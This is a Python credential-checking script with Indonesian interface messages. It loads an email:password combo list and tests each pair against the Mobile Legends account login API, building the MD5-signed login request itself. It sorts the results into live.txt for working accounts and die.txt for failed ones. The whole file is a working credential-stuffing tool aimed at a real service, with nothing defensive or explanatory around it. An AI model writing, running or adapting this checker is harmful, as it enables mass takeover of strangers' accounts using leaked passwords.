import requests
import os
import sys
import hashlib
import json
import time
from multiprocessing.pool import ThreadPool

if sys.version_info.major != 3:
    exit('\033[91m[WARNING] Gunakan python versi 3\033[0m')

class MOONTON:
    def __init__(self):
        self.userdata = []
        self.live = [] # Menyimpan akun yang berhasil
        self.die = []  # Menyimpan akun yang gagal
        self.api = 'https://accountmtapi.mobilelegends.com/'
        self.loading_symbols = ['\\', '|', '/', '-']
        self.loading_index = 0

    def loading_animation(self):
        sys.stdout.write('\r\033[92m[+] Memeriksa akun\033[0m ' + self.loading_symbols[self.loading_index % 4])
        sys.stdout.flush()
        self.loading_index += 1
        time.sleep(0.1)

    def progress_bar(self, current, total, bar_length=40):
        progress = int(current / total * bar_length)
        bar = '=' * progress + '-' * (bar_length - progress)
        sys.stdout.write('\r\033[94;3m[+] Progress: [{0}] {1}/{2} ({3:.2f}%)\033[0m'.format(bar, current, total, current / total * 100))
        sys.stdout.flush()

    def main(self):
        print('[\033[92m!] Pemisah email:password atau email|password\033[0m\n')
        empas = input('[?] List empas (ex: list.txt): ')
        if os.path.exists(empas):
            total_accounts = sum(1 for line in open(empas))
            for data in open(empas, 'r').readlines():
                try:
                    user = data.strip().split('|')
                    if user[0] and user[1]:
                        self.userdata.append({
                            'email': user[0],
                            'pw': user[1],
                            'userdata': data.strip()
                        })
                except IndexError:
                    try:
                        user = data.strip().split(':')
                        if user[0] and user[1]:
                            self.userdata.append({
                                'email': user[0],
                                'pw': user[1],
                                'userdata': data.strip()
                            })
                    except:
                        pass
            if len(self.userdata) == 0:
                exit('\033[91m[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass\033[0m')
            print('[*] Total {0} Account\n'.format(str(len(self.userdata))))

            # Menjalankan thread untuk memeriksa akun
            self.validate_accounts()

            # Menyimpan histori ke file
            self.save_history()

        else:
            print('\033[91m[!] File tidak ditemukan "{0}"\033[0m'.format(empas))

    def build_params(self, user):
        md5 = hashlib.new('md5')
        md5.update(user['pw'].encode('utf-8'))
        md5pwd = md5.hexdigest()
        sign = 'account={0}&md5pwd={1}&op=login'.format(user['email'], md5pwd)
        md5 = hashlib.new('md5')
        md5.update(sign.encode('utf-8'))
        hashed = md5.hexdigest()
        return json.dumps({
            'op': 'login',
            'sign': hashed,
            'params': {
                'account': user['email'],
                'md5pwd': md5pwd,
            },
            'lang': 'cn'
        })

    def validate(self, user):
        try:
            data = self.build_params(user)
            response = requests.post(self.api, data=data).json()
            if response['message'] == 'Error_Success':
                print('[\033[92mBERHASIL\033[0m] '+user['userdata'])
                self.live.append(user['userdata'])
            else:
                print('[\033[91mGAGAL\033[0m] '+user['userdata'])
                self.die.append(user['userdata'])
        except:
            self.validate(user)

    def validate_accounts(self):
        print('[+] Memeriksa akun...\n')
        for _ in range(3):
            for i, user in enumerate(self.userdata, 1):
                self.loading_animation()
                self.progress_bar(i, len(self.userdata))
                self.validate(user)
        print('\n[+] Proses selesai.\n')

    def save_history(self):
        print('[+] Menyimpan histori...\n')
        if len(self.live) > 0:
            with open('live.txt', 'w') as f:
                for data in self.live:
                    f.write(data + '\n')
            print('[+] BERHASIL: {0} - saved: live.txt'.format(str(len(self.live))))
        if len(self.die) > 0:
            with open('die.txt', 'w') as f:
                for data in self.die:
                    f.write(data + '\n')
            print('[+] GAGAL: {0} - saved: die.txt'.format(str(len(self.die))))

if __name__ == '__main__':
    MOONTON().main()
        
